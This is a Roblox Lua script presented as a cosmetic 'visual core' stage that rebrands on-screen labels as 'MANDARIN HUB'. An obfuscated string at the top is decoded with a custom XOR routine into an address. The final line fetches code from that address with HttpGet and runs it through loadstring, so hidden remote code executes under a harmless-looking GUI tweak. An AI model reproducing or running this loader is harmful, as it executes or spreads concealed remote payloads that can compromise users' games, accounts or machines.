
--[[ STAGE 2: VISUAL CORE ]]
local SLuRP2lxGDOlq="\162\161\164\163\163\095\117\120\176\196\185\133\207\200\200\207\205\219\211\208\233\215\233\232\236\233\251\245\242\187\001\000\005\198\238\012\026\255\019\024\208\212\225\006\045\050\046\058\039\052\051\062\255\055\079\081\063\014\080\094\093\101\081\032\101\108\103\109\047\085\117\126\134\136\118"local ACt2JfrSs695uaNfwvn=27 local i1KlhEWXWEha=39 local aXQhiR_d16Qg27HldbEdq=0 local wQT6cJS340pm1zu=3 local ueaHO97FcKpO3yfaA9mvhP=5 local tIQD14JU3CPfBAOP=false local v3tdEEI7xnZ6=bit32 and bit32.bxor if not v3tdEEI7xnZ6 then v3tdEEI7xnZ6=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local GmhQ6IXcz9V0gU_4dcoi={}for b3Tr6MghNpXv3yIwLaVvQ7=1,#SLuRP2lxGDOlq do local fc4AJEQWviLHQWdi4iW=string.byte(SLuRP2lxGDOlq,b3Tr6MghNpXv3yIwLaVvQ7)local dWzu_HltsbT64qHO7t=(i1KlhEWXWEha+(b3Tr6MghNpXv3yIwLaVvQ7*wQT6cJS340pm1zu)+ueaHO97FcKpO3yfaA9mvhP)%256 if aXQhiR_d16Qg27HldbEdq==0 then fc4AJEQWviLHQWdi4iW=(fc4AJEQWviLHQWdi4iW-dWzu_HltsbT64qHO7t)%256 GmhQ6IXcz9V0gU_4dcoi[b3Tr6MghNpXv3yIwLaVvQ7]=string.char(v3tdEEI7xnZ6(fc4AJEQWviLHQWdi4iW,ACt2JfrSs695uaNfwvn))else fc4AJEQWviLHQWdi4iW=v3tdEEI7xnZ6(fc4AJEQWviLHQWdi4iW,ACt2JfrSs695uaNfwvn)GmhQ6IXcz9V0gU_4dcoi[b3Tr6MghNpXv3yIwLaVvQ7]=string.char((fc4AJEQWviLHQWdi4iW-dWzu_HltsbT64qHO7t)%256)end end local Zu8dGbLqsPb8qd0dsT1CC=table.concat(GmhQ6IXcz9V0gU_4dcoi)if tIQD14JU3CPfBAOP then Zu8dGbLqsPb8qd0dsT1CC=string.reverse(Zu8dGbLqsPb8qd0dsT1CC)end local KClPVTWAEkWuUEa2r=Zu8dGbLqsPb8qd0dsT1CC
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(KClPVTWAEkWuUEa2r))()
